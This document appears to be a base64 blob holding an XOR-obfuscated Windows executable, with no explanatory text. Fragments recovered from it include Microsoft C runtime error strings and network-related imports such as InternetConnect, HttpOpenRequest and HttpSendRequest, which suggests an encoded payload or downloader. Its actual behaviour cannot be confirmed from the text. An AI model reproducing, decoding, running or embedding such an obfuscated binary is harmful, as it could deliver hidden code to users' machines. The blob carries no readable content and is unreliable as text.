RcnFyUXLxcaFx0XOhc3F2IXeRd2F3UXexdyFzcXYxd4FzcXfhd5F34XYxd+F3YXexd+F20Xchc3F38Xchd2F2cXGhcdFxcXFxcXFxcXRRchFycXJRcgFxoXHRc6FzcXeRd4F2MXNxdyF3kXeBdiF3AXfxc3F2QXZxd2F3QXchc3F3EXeBdlFzcXexd4F2AXfhd4FzcXfhd5F34XYxd+F3YXexd+F20XdhdjF34XeBd5FxoXHRcXFxcXFxcXF0UXIRcnFyUXIRcaFx0XOhc3F3kXeBdjFzcXchd5F3gXYhdwF38XNxdkF2cXdhd0F3IXNxdxF3gXZRc3F2QXYxdzF34XeBc3F34XeRd+F2MXfhd2F3sXfhdtF3YXYxd+F3gXeRcaFx0XFxcXFxcXFxdFFyEXJxclFyIXGhcdFzoXNxdnF2IXZRdyFzcXYRd+F2UXYxdiF3YXexc3F3EXYhd5F3QXYxd+F3gXeRc3F3QXdhd7F3sXGhcdFxcXFxcXF0UXIRcnFyUXIxcaFx0XOhc3F3kXeBdjFzcXchd5F3gXYhdwF38XNxdkF2cXdhd0F3IXNxdxF3gXZRc3F0gXeBd5F3IXbxd+F2MXOBd2F2MXchdvF34XYxc3F2MXdhd1F3sXchcaFx0XFxcXFxcXFxdFFyEXJxcmFy4XGhcdFzoXNxdiF3kXdhd1F3sXchc3F2MXeBc3F3gXZxdyF3kXNxd0F3gXeRdkF3gXexdyFzcXcxdyF2EXfhd0F3IXGhcdFxcXFxcXFxcXRRchFycXJhcvFxoXHRc6FzcXYhd5F3IXbxdnF3IXdBdjF3IXcxc3F38Xchd2F2cXNxdyF2UXZRd4F2UXGhcdFxcXFxcXFxcXRRchFycXJhcgFxoXHRc6FzcXYhd5F3IXbxdnF3IXdBdjF3IXcxc3F3oXYhd7F2MXfhdjF38XZRdyF3YXcxc3F3sXeBd0F3wXNxdyF2UXZRd4F2UXGhcdFxcXFxcXFxcXRRchFycXJhchFxoXHRc6FzcXeRd4F2MXNxdyF3kXeBdiF3AXfxc3F2QXZxd2F3QXchc3F3EXeBdlFzcXYxd/F2UXchd2F3MXNxdzF3YXYxd2FxoXHRcXF0UXIRcnFyYXJxcaFx0XOhc3F3YXdRd4F2UXYxc/Fz4XNxd/F3YXZBc3F3UXchdyF3kXNxd0F3YXexd7F3IXcxcaFx0XFxcXF0UXIRcnFycXLhcaFx0XOhc3F3kXeBdjFzcXchd5F3gXYhdwF38XNxdkF2cXdhd0F3IXNxdxF3gXZRc3F3IXeRdhF34XZRd4F3kXehdyF3kXYxcaFx0XFxdFFyEXJxcnFy8XGhcdFzoXNxd5F3gXYxc3F3IXeRd4F2IXcBd/FzcXZBdnF3YXdBdyFzcXcRd4F2UXNxd2F2UXcBdiF3oXchd5F2MXZBcaFx0XFxcXFxcXRRchFycXJxclFxoXHRc6FzcXcRd7F3gXdhdjF34XeRdwFzcXZxd4F34XeRdjFzcXZBdiF2cXZxd4F2UXYxc3F3kXeBdjFzcXexd4F3YXcxdyF3MXGhcdFxcXFxcXFxcXFRcXF+dUFgcfFxcXj1QWBx4XFxdXVBYHHRcXF+9VFgcHFxcXt1UWBwYXFxdXVRYHBRcXF+9WFgcEFxcXt1YWBw8XFxcnVhYHDhcXF/dXFgcNFxcXZ1cWBwwXFxcXVxYHCxcXF6coFgcJFxcXZygWBwgXFxe/KRYHNxcXF1cpFgc2FxcXRysWB28XFxcnKxYHbhcXFwMrFgdtFxcX7ywWB+sXFxfnLBYH6BcXF8csFgdaF34XdBdlF3gXZBd4F3EXYxc3F0EXfhdkF2IXdhd7FzcXVBc8FzwXNxdFF2IXeRdjF34XehdyFzcXWxd+F3UXZRd2F2UXbhcXFxcXHRcdFxcXFxc5FzkXORcXFysXZxdlF3gXcBdlF3YXehc3F3kXdhd6F3IXNxdiF3kXfBd5F3gXYBd5FykXFxcXF0UXYhd5F2MXfhd6F3IXNxdSF2UXZRd4F2UXNhcdFx0XRxdlF3gXcBdlF3YXehctFzcXFxdfF18XLRd6F3oXLRdkF2QXFxcXF3MXcxdzF3MXOxc3F1oXWhdaF1oXNxdzF3MXOxc3F24XbhduF24XFxdaF1oXOBdzF3MXOBduF24XFxcXF0cXWhcXFxcXVhdaFxcXFxdTF3IXdBdyF3oXdRdyF2UXFxcXF1kXeBdhF3IXehd1F3IXZRcXFxcXWBd0F2MXeBd1F3IXZRcXF0QXchdnF2MXchd6F3UXchdlFxcXVhdiF3AXYhdkF2MXFxcXF10XYhd7F24XFxcXF10XYhd5F3IXFxcXF1YXZxdlF34XexcXF1oXdhdlF3QXfxcXF1EXchd1F2UXYhd2F2UXbhcXFxcXXRd2F3kXYhd2F2UXbhcXF1MXchd0FxcXWRd4F2EXFxdYF3QXYxcXF0QXchdnFxcXVhdiF3AXFxddF2IXexcXF10XYhd5FxcXWhd2F24XFxdWF2cXZRcXF1oXdhdlFxcXURdyF3UXFxddF3YXeRcXF0QXdhdjF2IXZRdzF3YXbhcXFxcXURdlF34Xcxd2F24XFxcXF0MXfxdiF2UXZBdzF3YXbhcXFxcXQBdyF3MXeRdyF2QXcxd2F24XFxdDF2IXchdkF3MXdhduFxcXWhd4F3kXcxd2F24XFxcXF0QXYhd5F3MXdhduFxcXFxdEF3YXYxcXF1EXZRd+FxcXQxd/F2IXFxdAF3IXcxcXF0MXYhdyFxcXWhd4F3kXFxdEF2IXeRcXF19fLXp6LWRkFxcXF3Nzc3M7N1paWlo3c3M7N25ubm4XWlo4c3M4bm4XFxcXR1oXF1ZaFxdTcnRyenVyZRcXFxdZeGFyenVyZRcXFxdYdGN4dXJlF0RyZ2NyenVyZRcXF1ZicGJkYxcXXWJ7bhcXFxddYnlyFxcXF1ZnZX57FxcXWnZldH8XFxdRcnVlYnZlbhcXFxdddnlidmVuF1NydBdZeGEXWHRjF0RyZxdWYnAXXWJ7F11ieRdadm4XVmdlF1p2ZRdRcnUXXXZ5F0R2Y2Jlc3ZuFxcXF1FlfnN2bhcXQ39iZWRzdm4XFxcXQHJzeXJkc3ZuFxcXQ2JyZHN2bhdaeHlzdm4XF0RieXN2bhcXRHZjF1FlfhdDf2IXQHJzF0NichdaeHkXRGJ5FxYVFBMSERAfHh0cGxoZGAcGBQQDAgEADw4NDAsKCQg3NjU0MzIxMD8+PTw7Ojk4JyYlJCMiISAvLi0sKyopKFdWVVRTUlFQX15dXFtaWVhHRkVEQ0JBQE9OTUxLSklId3Z1dHNycXB/fn18e3p5eGdmZWRjYmFgb25tbGtqaWgXKhcXFzdUeHpne3JjcjdYdX1ydGM3W3h0dmN4ZTAXFxc3VHt2ZGQ3X35yZXZldH9uN1NyZHRlfmdjeGUwFxcXFzdVdmRyN1R7dmRkN1ZlZXZuMBcXN1V2ZHI3VHt2ZGQ3U3JkdGV+Z2N4ZTd2Yzc/FzdDbmdyN1NyZHRlfmdjeGUwFxcXd3t4dHZ7N2RjdmN+dDdjf2VydnM3cGJ2ZXMwF3d6dnl2cHJzN2FydGN4ZTd0eGduN3R4eWRjZWJ0Y3hlN35jcmV2Y3hlMBcXd2FydGN4ZTdhdXZkcjd0eGduN3R4eWRjZWJ0Y3hlN35jcmV2Y3hlMBcXFxd3YXJ0Y3hlN3R4Z243dHh5ZGNlYnRjeGU3fmNyZXZjeGUwFxd3c255dnp+dDd2Y3JvfmM3c3JkY2VidGN4ZTdxeGU3MBcXFxd3c255dnp+dDd+eX5jfnZ7fm1yZTdxeGU3MBcXd3J/N2FydGN4ZTdhdXZkcjd0eGduN3R4eWRjZWJ0Y3hlN35jcmV2Y3hlMBd3cn83YXJ0Y3hlN3R4Z243dHh5ZGNlYnRjeGU3fmNyZXZjeGUwFxcXd3p2eXZwcnM3YXJ0Y3hlN3NyZGNlYnRjeGU3fmNyZXZjeGUwFxcXF3d6dnl2cHJzN2FydGN4ZTd0eHlkY2VidGN4ZTd+Y3JldmN4ZTAXFxd3Z3t2dHJ6cnljN3Nye3JjckxKN3R7eGRiZXIwFxcXF3dne3Z0cnpyeWM3c3J7cmNyN3R7eGRiZXIwFxd3eHp5fjd0dnt7ZH5wMBcXN3Nye3JjckxKFxcXN3lyYExKFxd3e3h0dns3YXFjdnV7cjd0eHlkY2VidGN4ZTd0e3hkYmVyMBd3e3h0dns3YXFjdnV7cjAXd0VDQ14XFxd3Ul8Xd2JzYzdlcmNiZXl+eXAwF3d0eGduN3R4eWRjZWJ0Y3hlN3R7eGRiZXIwFxd3cn83YXJ0Y3hlN2F1dmRyN3R4eWRjZWJ0Y3hlN35jcmV2Y3hlMBcXd3J/N2FydGN4ZTdzcmRjZWJ0Y3hlN35jcmV2Y3hlMBd3cn83YXJ0Y3hlN3R4eWRjZWJ0Y3hlN35jcmV2Y3hlMBcXFxd3YX5lY2J2ezdzfmRne3Z0cnpyeWM3enZnMBcXd2FydGN4ZTdhdXZkcjd0eHlkY2VidGN4ZTd+Y3JldmN4ZTAXd2FydGN4ZTdzcmRjZWJ0Y3hlN35jcmV2Y3hlMBcXFxd3YXJ0Y3hlN3R4eWRjZWJ0Y3hlN35jcmV2Y3hlMBcXF3dkdHZ7dmU3c3J7cmN+eXA3c3JkY2VidGN4ZTAXFxcXd3NycXZie2M3dHh5ZGNlYnRjeGU3dHt4ZGJlcjAXFxd3YXJ0Y3hlN3Nye3JjfnlwN3NyZGNlYnRjeGUwFxcXF3dhdXZkcjdzcmRjZWJ0Y3hlMBcXd2RjZX55cDAXFxcXd3t4dHZ7N2RjdmN+dDdwYnZlczAXFxcXd2NuZ3J4cTAXFxcXd2F0dnt7MBd3YXVjdnV7cjAXFxd3YXFjdnV7cjAXFxdJKhcXayoXFzEqFxcrKyoXKSkqFzIqFxc4KhcXOioXFzwqFxc9KhcXa2sXFzExFxdrFxcXSRcXF2kXFxc/PhcXOxcXFykqFxcpFxcXKyoXFysXFxcyFxcXOik9FzEXFxc8FxcXOhcXFzo6Fxc8PBcXPRcXFzopFxd4Z3JldmN4ZRcXFxdMShcXNioXFyoqFxc2FxcXKysXFykpFxc3c3J7cmNyFzd5cmAXFxcXSEhieXZ7fnB5cnMXSEhlcmRjZX50YxcXSEhnY2UhIxdISHJ2dX4XF0hIdHtldHZ7excXF0hIcXZkY3R2e3sXF0hIY39+ZHR2e3sXF0hIZGNzdHZ7excXF0hIZ3ZkdHZ7FxcXF0hIdHNydHsXSEh1dmRycz8XFxcXM1gWBwtYFgcHWBYHE1gWB+9ZFgf7WRYH91kWB89ZFgfHWRYH01kWB69ZFgfOIRYHp1kWB79ZFgeHXhYHs1kWB7dZFgeLWRYHj1kWB4NZFgeHWRYHk1kWB5dZFgdrWRYHb1kWB2NZFgdnWRYHe1kWB39ZFgdzWRYH5yEWB3dZFgdLWRYHT1kWB0NZFgdHWRYHW1kWB19ZFgdTWRYHV1kWBytZFgcvWRYHI1kWBydZFgc7WRYHP1kWBzNZFgc3WRYHC1kWBw9ZFgcDWRYHB1kWBxtZFgcXWRYH41oWB/taFgf3WhYH31oWB6taFge/WhYHn1oWB39aFgdfWhYHP1oWBx9aFgfzWxYH31sWB7NbFgeTWxYHS1sWB1dbFgcnWxYHO1sWBzNbFgcDWxYH51wWB/9cFgfLXBYH21wWB6dcFgeHXBYHf1wWB1dcFgcPXBYH+10WB8ddFge7XRYHn10WB0tdFgcnXRYHA10WB84hFgcXXRYH814WB8deFgenXhYHg14WBxcXFxcRl5eRl5aXFxcHFJGXkZWXAxISUlJSkpKSEhcXJyeXR5efFx8XPzAvR0CXFxAXICcnR0efFxcXNz+Xn5eXFxcXd393f39/Hx8Qb2dnYGdnHx8XFx8XHxcQHxcXF1ByY0dleHRyZGRAfnlzeGBEY3Zjfnh5F1ByY0JkcmVYdX1ydGNeeXF4ZXp2Y354eUAXFxdQcmNbdmRjVnRjfmFyR3hnYmcXF1ByY1Z0Y35hckB+eXN4YBdacmRkdnByVXhvQBdCF0QXUhdFFyQXJRc5F1MXWxdbFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXNxc3FzcXNxc3FzcXNxc3FzcXPxc/Fz8XPxc/FzcXNxc3FzcXNxc3FzcXNxc3FzcXNxc3FzcXNxc3FzcXNxc3F18XBxcHFwcXBxcHFwcXBxcHFwcXBxcHFwcXBxcHFwcXkxeTF5MXkxeTF5MXkxeTF5MXkxcHFwcXBxcHFwcXBxcHF5YXlheWF5YXlheWFxYXFhcWFxYXFhcWFxYXFhcWFxYXFhcWFxYXFhcWFxYXFhcWFxYXFhcHFwcXBxcHFwcXBxeVF5UXlReVF5UXlRcVFxUXFRcVFxUXFRcVFxUXFRcVFxUXFRcVFxUXFRcVFxUXFRcVFxUXBxcHFwcXBxc3FxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFzcXNxc3FzcXNxc3FzcXNxc3F38XPxc/Fz8XPxc3FzcXNxc3FzcXNxc3FzcXNxc3FzcXNxc3FzcXNxc3FzcXNxdfFwcXBxcHFwcXBxcHFwcXBxcHFwcXBxcHFwcXBxcHF5MXkxeTF5MXkxeTF5MXkxeTF5MXBxcHFwcXBxcHFwcXBxeWFpYWlhaWFpYWlhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWBxcHFwcXBxcHFwcXlRaVFpUWlRaVFpUWFRYVFhUWFRYVFhUWFRYVFhUWFRYVFhUWFRYVFhUWFRYVFhUWFRYVFgcXBxcHFwcXNxc3FzcXNxc3FzcXNxc3FzcXNxc3FzcXNxc3FzcXNxc3FzcXNxc3FzcXNxc3FzcXNxc3FzcXNxc3FzcXNxc3FzcXXxcHFwcXBxcHFwcXBxcHFwcXBxcHFwcXBxcHFwcXBxcHFwcXAxcDFwcXBxcHFwcXBxcDFwcXBxcHFwcXBxcHFxYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYHFxYWFhYWFhYWFhYWFhYWFRYVFhUWFRYVFhUWFRYVFhUWFRYVFhUWFRYVFhUWFRYVFhUWFRYVFhUWFRYVFhUWBxcVFhUWFRYVFhUWFRYVFhUWFhYXFxcXl5aVlJOSkZCfnp2cm5qZmIeGhYSDgoGAj46NjIuKiYi3trW0s7KxsL++vby7urm4p6alpKOioaCvrq2sq6qpqNfW1dTT0tHQ397d3Nva2djHxsXEw8LBwM/OzczLysnI9/b19PPy8fD//v38+/r5+Ofm5eTj4uHg7+7t7Ovq6egXFhUUExIREB8eHRwbGhkYBwYFBAMCAQAPDg0MCwoJCDc2NTQzMjEwPz49PDs6OTgnJiUkIyIhIC8uLSwrKikoV3Z1dHNycXB/fn18e3p5eGdmZWRjYmFgb25tTEtKSUh3dnV0c3JxcH9+fXx7enl4Z2ZlZGNiYWBvbm1sa2ppaJeWlZSTkpGQn56dnJuamZiHhoWEg4KBgI+OjYyLiomIt7a1tLOysbC/vr28u7q5uKempaSjoqGgr66trKuqqajX1tXU09LR0N/e3dzb2tnYx8bFxMPCwcDPzs3My8rJyPf29fTz8vHw//79/Pv6+fjn5uXk4+Lh4O/u7ezr6unol5aVlJOSkZCfnp2cm5qZmIeGhYSDgoGAj46NjIuKiYi3trW0s7KxsL++vby7urm4p6alpKOioaCvrq2sq6qpqNfW1dTT0tHQ397d3Nva2djHxsXEw8LBwM/OzczLysnI9/b19PPy8fD//v38+/r5+Ofm5eTj4uHg7+7t7Ovq6egXFhUUExIREB8eHRwbGhkYBwYFBAMCAQAPDg0MCwoJCDc2NTQzMjEwPz49PDs6OTgnJiUkIyIhIC8uLSwrKikoV1ZVVFNSUVBfXl1cW1pZWEdGRURDQkFAT05NTEtKSUh3VlVUU1JRUF9eXVxbWllYR0ZFRENCQUBPTk1sa2ppaJeWlZSTkpGQn56dnJuamZiHhoWEg4KBgI+OjYyLiomIt7a1tLOysbC/vr28u7q5uKempaSjoqGgr66trKuqqajX1tXU09LR0N/e3dzb2tnYx8bFxMPCwcDPzs3My8rJyPf29fTz8vHw//79/Pv6+fjn5uXk4+Lh4O/u7ezr6unoVBdYF1kXWBdCF0MXMxcXF18XFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXF8eVFgdHSxYHDxcXFxcXFxcXFxcXFxcXF+OWFgcTTRYHFxcXFxcXFxcVFxcXA00WBzdNFgcrTRYHFxcXF+OWFgcWFxcXFxcXF+jo6OgXFxcXVxcXFxNNFgcHlRYHFxcXFxcXFxfo6OjoFxcXF1cXFxdPTRYHFxcXFxcXFxcWFxcXf00WBytNFgcXFxcXFxcXFxcXFxcXFxcXO5UWB5NNFgcXFxcXFxcXFxYXFxeDTRYHi00WBxcXFxc7lRYHFxcXFxcXFxfo6OjoFxcXF1cXFxeTTRYHFxcXFxcXFxcXFxcXX5UWB9tNFgcXFxcXFxcXFxUXFxfLTRYH/00WBytNFgcXFxcXX5UWBxYXFxcXFxcX6Ojo6BcXFxdXFxcX200WBxcXFxcXFxcXFxcXF3+VFgcPTBYHFxcXFxcXFxcUFxcXP0wWBy9MFgf/TRYHK00WBxcXFxd/lRYHFRcXFxcXFxfo6OjoFxcXF1cXFxcPTBYHFxcXFxcXFxcXFxcXn5UWB39MFgcXFxcXFxcXFxQXFxdvTBYHn0wWB/9NFgcrTRYHFxcXF5+VFgcVFxcXFxcXF+jo6OgXFxcXVxcXF39MFgcXFxcXFxcXFxcXFxcHlRYHT00WBxcXFxcXFxcXFxcXF6eVFgfbTBYHFxcXFxcXFxcWFxcXy0wWB/NMFgcXFxcXp5UWBxcXFxcXFxcX6Ojo6BcXFxdXFxcX20wWBxcXFxcXFxcXFxcXFzeQFgcDSxYHFxcXFxcXFxcVFxcXM0sWBydLFgcrTRYHFxcXFzeQFgcWFxcXFxcXF+jo6OgXFxcXVxcXFwNLFgcXFxcXS3oXF3F5FxdnmRcXd7MXF0foFxdXDRYXjg0WF88NFhcPDBYXRwwWF5cMFheuDBYX7gwWF9ILFhcfChYXXwoWF4cKFhf2ChYXLgkWF+cJFhcpCBYXhggWF/YIFhceNxYXFxcXFxcXFxcXFxcXFxcXFxcXFxcXBxcHFxcXF8dLFgcVFxcXy0sWB+9LFgcXFxcX45YWBxcXFxfo6OjoFxcXFxsXFxd3BhcHFxcXFweVFgcXFxcX6Ojo6BcXFxcbFxcX+nYXB1cXFxcXFxcXFxcXF2QEFwdXFxcXFxcXFxcXFxfsBBcH6Ojo6BcXFxfo6OjoFxcXFxYXFxcXFxcXFhcXFxcXFxc1EoQOExcXFyNKFgcVFxcXb0oWBxcXFxcXFxcXFxcXFxYXFxcVFxcXFRcXFxQXFxcWFxcXM0oWBxcXFxcXFxcXFBcXFxYXFxcDShYHNRKEDhEXFxfTShYHFxcXFxcXFxcXFxcXFxcXFxcXFxcWFxcX6Ojo6HcNFgcXFxcXfA0WBxYXFxdkDRYHFRcXF2kNFgcXFxcXng0WBxcXFxeGDRYH6Ojo6McNFgc1EoQOFhcXF+NKFgcXFxcXFxcXFxcXFxcXFxcXFxcXFxYXFxfo6OjoFwwWBxcXFxcfDBYHFhcXFwcMFgc1EoQOFBcXFzdJFgcXFxcXFxcXFxcXFxcXFxcXFxcXFxYXFxfo6OjoVwwWBxcXFxdfDBYHNRKEDhUXFxdLSRYHFxcXFxcXFxcXFxcXFxcXFxcXFxcWFxcX6Ojo6GcMFgcXFxcXbwwWBzUShA4VFxcXh0kWBxcXFxcXFxcXFxcXFxcXFxcXFxcXFhcXF+jo6Oi3DBYHNRKEDhYXFxfTSRYHFxcXFxcXFxcXFxcXFxcXFxcXFxcWFxcX6Ojo6PcMFgc1EoQOFhcXF+dJFgcXFxcXFxcXFxcXFxcXFxcXFxcXFxYXFxc1EoQOGBcXF1dIFgcXFxcXFxcXFxcXFxcXFxcXFxcXFxYXFxfo6OjoNwsWBxcXFxc8CxYHFhcXFyELFgfo6OjoVgsWBxQXFxdbCxYHExcXF0ALFgfo6OjodQsWBxEXFxd6CxYHEBcXF28LFgcfFxcXlAsWBxEXFxeZCxYH6Ojo6I4LFgccFxcXswsWBxsXFxe4CxYHGhcXF60LFgfo6Ojo5wsWBxcXFxfvCxYHFhcXFxcKFgc1EoQOFBcXF69IFgcXFxcXFxcXFxcXFxcXFxcXFxcXFxYXFxfo6OjoJwoWBxcXFxcvChYHFhcXF1cKFgc1EoQOFBcXF+NIFgcXFxcXFxcXFxcXFxcXFxcXFxcXFxYXFxfo6OjoZwoWBxcXFxdvChYHFhcXF5cKFgcWFxcXnwoWBzUShA4TFxcXJ3cWBxcXFxcXFxcXFxcXFxcXFxcXFxcXFhcXF+jo6OjfChYHFxcXF9cKFgc1EoQOFRcXF2N3FgcXFxcXFxcXFxcXFxcXFxcXFxcXFxYXFxfo6OjoBwkWBxcXFxc+CRYHFxcXFyYJFgc1EoQOFBcXF793FgcXFxcXFxcXFxcXFxcXFxcXFxcXFxYXFxc1EoQOGxcXFx92FgcXFxcXFxcXFxcXFxcXFxcXFxcXFxYXFxfo6OjodwkWBxcXFxd8CRYHFhcXF2EJFgcVFxcXlgkWBxQXFxebCRYHExcXF40JFgcSFxcXvwkWBxEXFxehCRYHEBcXF9MJFgcfFxcXxQkWBx4XFxf3CRYHHhcXF/8JFgfo6OjoNwgWBxcXFxc/CBYHFxcXFyQIFgc1EoQOFBcXF392FgcXFxcXFxcXFxcXFxcXFxcXFxcXFxYXFxfo6OjoZwgWBxcXFxeRCBYHFxcXF2wIFgc1EoQOFBcXF7N2FgcXFxcXFxcXFxcXFxcXFxcXFxcXFxYXFxfo6Ojo1wgWB+jo6OjcCBYHFhcXF8EIFgc1EoQOFBcXF/d2FgcXFxcXFxcXFxcXFxcXFxcXFxcXFxYXFxcXFxcXX5UWBxcXFxfo6OjoFxcXFxsXFxdXSRcHFxcXFyxJFwcXFxcXX3UWBxQXFxdPdRYHC3UWB+9LFgcXFxcXf5UWBxcXFxfo6OjoFxcXFxsXFxeaSRcHFxcXFyxJFwcXFxcXk3UWBxQXFxeDdRYHC3UWB+9LFgcXFxcXn5UWBxcXFxfo6OjoFxcXFxsXFxfNSRcH6ejo6BcXFxfD6OjoFxcXF+no6OgXFxcXMX0XBxcXFxfp6OjoFxcXF8Po6OgXFxcX6ejo6BcXFxf0fRcHFxcXF+no6OgXFxcXw+jo6BcXFxfp6Ojo2GcXB/RnFwcXFxcX6ejo6BcXFxfD6OjoFxcXF+no6OgXFxcX82EXBxcXFxfp6OjoFxcXF8Po6OgXFxcX6ejo6BcXFxftbxcHFxcXF+no6OgXFxcXw+jo6BcXFxfp6OjoFxcXFxdtFwcXFxcX6ejo6BcXFxfb6OjoFxcXF+no6OgXFxcXnGwXBxcXFxcXFxcXQGwXB+no6OgXFxcXw+jo6BcXFxfp6OjoFxcXFytrFwcXFxcX6ejo6BcXFxfD6OjoFxcXF+no6OgXFxcXZZYXBxcXFxfp6OjoFxcXF8/o6OgXFxcX6ejo6BcXFxdElRcHFxcXF+no6OgXFxcXw+jo6BcXFxfp6OjopJQXB9OUFwcXFxcX6ejo6BcXFxfD6OjoFxcXF+no6OgXFxcX1ZIXBxcXFxfp6OjoFxcXF8fo6OgXFxcX6ejo6BcXFxfRnhcHFxcXF+no6OgXFxcXx+jo6BcXFxfp6OjoFxcXF9W0FwcXFxcX6ejo6BcXFxfD6OjoFxcXF+no6OgXFxcXtLAXBxcXFxfp6OjoFxcXF8fo6OgXFxcX6ejo6BcXFxeEvhcHFxcXF0K+FwdIvhcH6ejo6BcXFxfP6OjoFxcXF+no6OgsvRcHU70XB1cXFxcXFxcXFxcXFwq8Fwfo6OjoFxcXF+jo6OgXFxcXFxcXFxcXFxcWFxcXFhcXF8tzFgc1EoQOFRcXF/tzFgcWFxcX63MWBxcXFxcXFxcXFxcXFxYXFxcXFxcX6ejo6BcXFxej6OjoFxcXF+no6OgXFxcXQrsXBxcXFxfSvBcH2bwXB+no6OgXFxcXw+jo6BcXFxfp6OjoK7kXB1e5FwcXFxcX6ejo6BcXFxfP6OjoFxcXF+no6OjCuRcHzrkXBxcXFxfgsBcHFxcXF7tyFgcVFxcXr3IWB+9LFgcXFxcXN5AWBxcXFxfo6OjoFxcXFxsXFxfbpBcHFxcXF+no6OgXFxcXz+jo6BcXFxfp6OjoFxcXFzyhFwfp6OjoFxcXFy2hFwfp6OjoFxcXF8/o6OgXFxcX6ejo6BcXFxf6oBcH6ejo6BcXFxfuoBcH6ejo6BcXFxfP6OjoFxcXF+no6OgZrRcHBa0XBxcXFxfp6OjoFxcXF8/o6OgXFxcX6ejo6EmtFwd1rRcHFxcXF+no6OgXFxcX1+jo6BcXFxfp6OjoFxcXF12qFwcXFxcX6ejo6BcXFxfH6OjoFxcXF+no6OgXFxcXqN0XBxcXFxfp6OjoFxcXF8fo6OgXFxcX6ejo6BcXFxdq2xcHFxcXF+no6OgXFxcXx+jo6BcXFxfp6OjoFxcXF1nDFwcXFxcX6ejo6BcXFxfH6OjoFxcXF+no6OgXFxcXMMIXBxcXFxfp6OjoFxcXF8Po6OgXFxcX6ejo6BcXFxe0wRcHFxcXF+no6OgXFxcXw+jo6BcXFxfp6OjoFxcXF83MFwcXFxcX6ejo6BcXFxfb6OjoFxcXF+no6OgXFxcXu8gXBxcXFxfp6OjoFxcXF8Po6OgXFxcX6ejo6BcXFxcn9BcHFxcXF+no6OgXFxcXw+jo6BcXFxfp6OjoFxcXF1P6FwcXFxcX6ejo6BcXFxff6OjoFxcXF+no6OgXFxcXHvgXBxcXFxcXFxcXUvkXB+no6OgXFxcXx+jo6BcXFxfp6OjoFxcXF7L4FwcXFxcX6ejo6BcXFxfP6OjoFxcXF+no6Ojc5xcHyecXBxcXFxfp6OjoFxcXF9vo6OgXFxcX6ejo6BcXFxdd7BcHFxcXF+no6OgXFxcX2+jo6BcXFxfp6OjoFxcXF9sWFgcXFxcX6ejo6BcXFxfX6OjoFxcXF+no6OgXFxcXhxMWBwN+FhcXFxcXFxcXF7t8FhcLJxYX738WFxcXFxcXFxcXGXsWFxcnFhdrfRYXFxcXFxcXFxc7exYXkyYWF0t9FhcXFxcXFxcXF9F7FhdzJhYXG34WFxcXFxcXFxcX83sWFwMnFhdDfRYXFxcXFxcXFxcTehYXSyYWFxcXFxcXFxcXFxcXFxcXFxcXFxcXF3sWF/t8FhfZfBYXrXwWFxcXFxfFexYXFxcXFw98Fhc/fBYXKXwWF1t8FhdNfBYXcXwWF298FheRfBYXgXwWF0NmFhcdfBYX4X0WF/99FhfPfRYXq30WF6N9FhexfRYXgX0WFyVmFhc1ZhYXA2YWFxNmFhdTZhYXk30WF+9nFhf9ZxYXB3oWFz16FhcrehYXX3oWF0F6Fhd7ehYXa3oWF596FheDehYXs3oWF6F6FhfFehYX8XoWFxV5Fhc3eRYXI3kWF1N5FhdLeRYXY3kWF5F5FheBeRYXqXkWF9t5FhfJeRYX4XkWFxV4FhcHeBYXCXgWFz94FhdXeBYXQ3gWF3N4FhdreBYXhXgWF4l4FhejeBYX03gWF8F4Fhf9eBYX73gWFxFnFhcLZxYXP2cWFyVnFhcpZxYXR2cWF3dnFhdhZxYXh2cWF71nFhfTZxYXzWcWF3FmFhcXFxcX5XsWFxcXFxefexYXIXsWF4l7Fhd3exYXY3sWF6d7FhddexYXFxcXFwt7FhcXFxcXUhVQcmNHZXh0VnNzZXJkZBcXKxRbeHZzW351ZXZlblYXFw4WUm9+Y0dleHRyZGQXpRNEe3JyZxcLFlJvZ3Z5c1J5YX5leHl6cnljRGNlfnlwZFYXFRVQcmNbdmRjUmVleGUXF0UXVHt4ZHJfdnlze3IX1xZQcmNUYmVlcnljR2V4dHJkZBdIFlFlcnJUeHlkeHtyFxQVUHJjW3h0dntDfnpyFxfuE0B2fmNReGVEfnlwe3JYdX1ydGMXxBdTcntyY3JRfntyVhd1FlFlcnJbfnVldmVuF9cURXJ2c1F+e3IXF3ETRHJjUX57ckd4fnljcmUXF+cWUHJjUX57ckR+bXIXhBVQcmNDfnR8VHhieWMXF54UWGJjZ2JjU3J1YnBEY2V+eXBWFxdcUkVZUlskJTlze3sXF9cVRHJjRHJlYX50ckRjdmNiZBcXnxVFcnB+ZGNyZURyZWF+dHJUY2V7X3Z5c3tyZUAXehVFcnBGYnJlbkF2e2JyUm9WFxcnFUVycFR7eGRyXHJuF1ZTQVZHXiQlOXN7excXGBdUeFRlcnZjclBifnMXF3h7ciQlOXN7exdmF155Y3JleXJjVHh5eXJ0Y1YXF3wXXnljcmV5cmNUe3hkcl92eXN7chdMF19jY2dEcnlzRXJmYnJkY1YXF0AXX2NjZ1hncnlFcmZicmRjVhcXu